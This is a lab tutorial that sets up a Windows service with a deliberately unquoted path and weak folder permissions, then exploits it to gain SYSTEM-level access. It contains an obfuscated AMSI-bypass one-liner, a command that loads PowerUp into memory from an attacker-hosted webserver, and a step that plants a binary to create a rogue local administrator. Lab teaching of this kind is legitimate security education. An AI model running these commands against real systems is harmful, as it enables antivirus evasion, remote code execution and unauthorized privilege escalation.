---
description: >-
  We will create a service with a Unquoted Service Path to escalate privileges
  from a low privileges user account to SYSTEM.
---

# Unqouted Service Path

## Configuring

1. Login to `WS01` as the `Administrator` user with password `Welcome01!`.
2. Start PowerShell as administrator and run the following commands to create a service:

* Name = `Service`
* Executable path = `C:\Program Files\bin folder\program\bin x64\Service.exe`
* Start = `auto`

```
sc.exe create "Service" binpath= "C:\Program Files\bin folder\program\bin x64\Service.exe" start= auto
```

![](<../../../.gitbook/assets/image (11) (1) (1).png>)

3\. Run the following command to create the folders for the service:

```
mkdir "C:\Program Files\bin folder\program\bin x64"
```

![](<../../../.gitbook/assets/image (10) (1) (2) (1).png>)

4\. Run icacls to check the current permissions on the directories with a space in it:

```
icacls.exe "C:\Program Files\bin folder"
icacls.exe "C:\Program Files\bin folder\program\bin x64"
```

![](<../../../.gitbook/assets/image (15) (2).png>)

Currently the low privileged users can't create any files in the directories with a space. BUILTIN\Users has (RX) privileges. Which is **RX** (read and execute access). For more information about the icacls access rights check out [this SuperUser](https://superuser.com/questions/322423/explain-the-output-of-icacls-exe-line-by-line-item-by-item) post.

5\. Run icacls to give the `BUILTIN\Users` write permissions on `C:\Program Files\bin folder\program`.

```
icacls.exe "C:\Program Files\bin folder\program" /grant BUILTIN\Users:W
```

![](<../../../.gitbook/assets/image (8) (1) (1) (1).png>)

6\. Run icacls again the check the permissions on the directory:

```
icacls.exe "C:\Program Files\bin folder\program"
```

![](<../../../.gitbook/assets/image (3) (1) (1) (1).png>)

## Attacking

### How it works

When a service exists whose executable path contains spaces and it isn't enclosed within quotes it could be used to run an executable of our choice. This is because if the service is not enclosed within quotes and it has spaces, it would handle the space as a break and pass the rest of the service path as an argument.

If the filename is a long string of text which contains spaces, and is not enclosed within quotation marks, the filename will be executed in the order from left to right until the space is reached and will append `.exe` at the end of this spaced path. For example, consider we have the following path:

`C:\Program Files\A Folder\B Folder\C Folder\Program.exe`

Windows will try to execute the following:

1. `C:\Program Files\A.exe`
2. `C:\Program Files\A Folder\B.exe`
3. `C:\Program Files\A Folder\B Folder\C.exe`
4. `C:\Program Files\A Folder\B Folder\C Folder\Program.exe`

### Tools

* Icacls.exe
* [PowerUp](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1)

### Executing the attack

#### Powerup

1. Download PowerUp on your attacking machine and host it on a webserver

```
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
python3 -M http.server 8090
```

![](<../../../.gitbook/assets/image (43) (1) (1) (1) (1).png>)

2\. Login on `WS01` with the user `John` and the password `Welcome2022!.`

```
evil-winrm -i 10.0.0.128 -u john -p 'Welcome2022!'
```

3\. Open Powershell, execute a amsi bypass such ass the one below and download PowerUp into memory with `iex` and `iwr` (`Invoke-Expression` and `Invoke-WebRequest`)

```
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
iex (iwr http://192.168.248.2:8090/PowerUp.ps1 -usebasicparsing)
```

![](<../../../.gitbook/assets/image (2) (1) (1).png>)

4\. Execute `Invoke-AllChecks` to run all the checks from `PowerUp`.

![](<../../../.gitbook/assets/image (23) (1) (1) (1).png>)

5\. The output tells us there is a service with the name `Service` and it has a **unqouted** service path (`C:\Program Files\bin folder\program\bin x64\service.exe`).

6\. To check if we can write a binary in one of the folders check the permissions the folders before the one with a space in it. Since we need to write the binaries `C:\Program Files\bin.exe` or `C:\Program Files\bin folder\program\bin.exe`.

```
icacls.exe "C:\Program Files"
icacls.exe "C:\Program Files\bin folder\program"
```

We have no write permissions in `C:\Program Files`:

![](<../../../.gitbook/assets/image (52) (1) (1) (1) (1).png>)

But we do have write permissions in `C:\Program Files\bin folder\program`.

![](<../../../.gitbook/assets/image (20) (1).png>)

7\. To abuse this run the following command from PowerUp, which will create a executable `bin.exe` in the path `C:\Program Files\bin folder\program` which will add a new local administrator.

```
Write-ServiceBinary -ServiceName 'Service' -ServicePath 'C:\Program Files\bin folder\program\bin.exe' -Username 'privesc' -Password "Welcome2022!" 
```

![](<../../../.gitbook/assets/image (22) (1) (1).png>)

8\. Our current user can't start the service, which means we should restart the machine and check if the user `privesc` is created.

![](<../../../.gitbook/assets/image (13) (1) (1) (1) (1) (1).png>)

![](<../../../.gitbook/assets/image (9) (1) (1) (1) (1).png>)

9\. Start a new PowerShell session as Administrator and fill in the credentials `privesc:Welcome2022!`.

![](<../../../.gitbook/assets/image (47) (1) (1) (1) (1).png>)

![](<../../../.gitbook/assets/image (39) (1) (1) (1) (1).png>)

#### Cleanup

Remove the user privesc and the binary

```
Remove-Item C:\Program Files\bin folder\program\bin.exe
net user privesc /del
```

## Defending

### Recommendations

* Periodically check for vulnerable services and directory permissions.

### Detection



## References

{% embed url="https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae" %}

{% embed url="https://superuser.com/questions/322423/explain-the-output-of-icacls-exe-line-by-line-item-by-item" %}

{% embed url="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1" %}

